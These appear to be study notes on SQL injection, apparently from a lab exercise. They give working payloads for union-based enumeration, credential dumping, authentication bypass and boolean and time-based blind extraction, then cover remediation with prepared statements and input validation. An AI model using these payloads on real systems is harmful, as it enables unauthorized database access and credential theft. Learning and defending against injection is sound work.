# SQL Injection (SQLi)

## Overview
SQL Injection (SQLi) is a web application vulnerability that occurs when unsanitized user input is directly incorporated into SQL queries executed by the backend database.

A successful SQL injection attack may allow an attacker to:

- Read sensitive data
- Modify or delete database records
- Bypass authentication mechanisms
- Enumerate database structure
- Extract user credentials
- In some cases, achieve remote code execution depending on DBMS privileges

---

## Database Fundamentals

### DBMS
A Database Management System (DBMS) is software used to create, manage, and interact with databases.

Common examples:

- MySQL
- PostgreSQL
- Microsoft SQL Server
- SQLite

---

### Tables
Relational databases store data inside tables.

A table consists of:

- **Columns (fields)** → define data type
- **Rows (records)** → actual stored data

Example:

| id | username | password |
|----|----------|----------|
| 1  | admin    | pass123  |

---

## Basic SQL Commands

### SELECT
Used to retrieve data.

```sql
SELECT * FROM users;
```

Specific columns:

```sql
SELECT username, password FROM users;
```

---

### WHERE
Used to filter results.

```sql
SELECT * FROM users WHERE username='admin';
```

---

### LIKE
Pattern matching.

Starts with:

```sql
LIKE 'a%'
```

Ends with:

```sql
LIKE '%n'
```

Contains:

```sql
LIKE '%mi%'
```

---

### LIMIT
Restricts number of returned rows.

```sql
SELECT * FROM users LIMIT 1;
```

---

### UNION
Combines results from multiple SELECT statements.

```sql
SELECT username FROM users
UNION
SELECT name FROM staff;
```

Requirements:

- Same number of columns
- Compatible data types

---

### INSERT

```sql
INSERT INTO users (username,password)
VALUES ('admin','pass123');
```

---

### UPDATE

```sql
UPDATE users
SET password='newpass'
WHERE username='admin';
```

---

### DELETE

```sql
DELETE FROM users WHERE username='admin';
```

---

# SQL Injection

## Concept
SQL Injection happens when user input is directly inserted into an SQL query without proper validation or sanitization.

Example vulnerable query:

```sql
SELECT * FROM users WHERE username='$user';
```

Attacker input:

```text
admin' UNION SELECT 1,2,3;--
```

Final query:

```sql
SELECT * FROM users
WHERE username='admin'
UNION SELECT 1,2,3;--
```

---

# Types of SQL Injection

## 1. In-Band SQL Injection
Same communication channel is used for both exploitation and receiving results.

### Error-Based SQLi
The application leaks SQL/database error messages.

Example:

```text
1'
```

If an SQL syntax error appears, the parameter is injectable.

---

### Union-Based SQLi
Uses UNION to append attacker-controlled results to the original query.

#### Step 1: Find Column Count

```text
1 UNION SELECT 1
```

```text
1 UNION SELECT 1,2
```

```text
1 UNION SELECT 1,2,3
```

If 3 works:

```text
Original query returns 3 columns
```

---

#### Step 2: Force Legit Query to Return Nothing

```text
0 UNION SELECT 1,2,3
```

Explanation:

- `0` makes the original query return no rows
- Only attacker-controlled UNION result remains visible

---

#### Step 3: Get Database Name

```text
0 UNION SELECT 1,2,database()
```

---

#### Step 4: Enumerate Tables

```text
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='sqli_one'
```

---

#### Step 5: Enumerate Columns

```text
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='staff_users'
```

---

#### Step 6: Dump Credentials

```text
0 UNION SELECT 1,2,group_concat(username,':',password)
FROM staff_users
```

---

## 2. Blind SQL Injection
No direct output is shown.

The attacker relies on indirect feedback.

---

### Authentication Bypass

Vulnerable query:

```sql
SELECT * FROM users
WHERE username='$user'
AND password='$pass'
LIMIT 1
```

Payload:

```text
' OR 1=1;--
```

Final query:

```sql
SELECT * FROM users
WHERE username=''
AND password=''
OR 1=1
```

Because:

```sql
1=1 = TRUE
```

Authentication is bypassed.

---

### Boolean-Based Blind SQLi
Application only returns TRUE/FALSE style feedback.

Example:

```text
admin123' UNION SELECT 1,2,3;--
```

This confirms valid column count.

Database enumeration:

```text
admin123' UNION SELECT 1,2,3 where database() like 's%';--
```

TRUE means:

```text
Database starts with "s"
```

Table discovery:

```text
admin123' UNION SELECT 1,2,3
FROM information_schema.tables
WHERE table_schema='sqli_three'
and table_name like 'u%';--
```

Column discovery:

```text
admin123' UNION SELECT 1,2,3
FROM information_schema.columns
WHERE TABLE_SCHEMA='sqli_three'
and TABLE_NAME='users'
and COLUMN_NAME like 'p%';--
```

Credential enumeration:

```text
admin123' UNION SELECT 1,2,3
FROM users
WHERE username='admin'
and password like '3%';--
```

This process reconstructs secrets character by character.

---

### Time-Based Blind SQLi
No visible output is returned.

Feedback comes from response timing.

Payload:

```text
admin123' UNION SELECT SLEEP(5),2;--
```

Explanation:

- Close original string
- Inject attacker-controlled UNION query
- Execute `SLEEP(5)`
- Comment out remaining SQL

If the response delays by 5 seconds:

```text
Payload executed successfully
```

Credential enumeration example:

```text
password like '4%'
password like '49%'
password like '496%'
password like '4961%'
```

---

## 3. Out-of-Band SQL Injection
Uses separate channels for attack and data exfiltration.

Example:

- Attack via HTTP request
- Exfiltration via DNS

---

# Remediation

## Prepared Statements (Best Practice)
Separates SQL logic from user input.

Safe query:

```sql
SELECT * FROM users WHERE username=? AND password=?
```

Even if user enters:

```text
' OR 1=1;--
```

It is treated as plain data, not executable SQL.

---

## Input Validation
Restrict accepted input to expected values.

Example:

If an ID should be numeric:

Accept:

```text
123
456
789
```

Reject:

```text
1 UNION SELECT 1,2,3
```

Allowlisting is preferred over blacklisting.

---

## Escaping User Input
Escape dangerous special characters:

```text
'
"
\
$
```

Example:

```text
'
```

becomes:

```text
\'
```

This prevents breaking SQL syntax.

---

# Key Takeaways

SQL Injection workflow:

1. Confirm injection point
2. Identify column count
3. Enumerate database
4. Enumerate tables
5. Enumerate columns
6. Extract credentials
7. Abuse authentication logic

Best defenses:

- Prepared Statements
- Input Validation
- Escaping User Input
